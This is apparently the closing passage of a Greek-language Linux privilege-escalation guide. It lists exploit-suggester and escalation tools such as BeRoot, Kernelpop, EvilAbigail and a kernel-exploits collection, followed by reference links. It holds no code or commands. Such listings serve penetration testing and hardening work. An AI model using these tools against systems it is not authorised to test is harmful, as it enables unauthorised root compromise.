**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Απαριθμεί ευπάθειες πυρήνα σε Linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (με φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Συλλογή περισσότερων σεναρίων**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Αναφορές

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
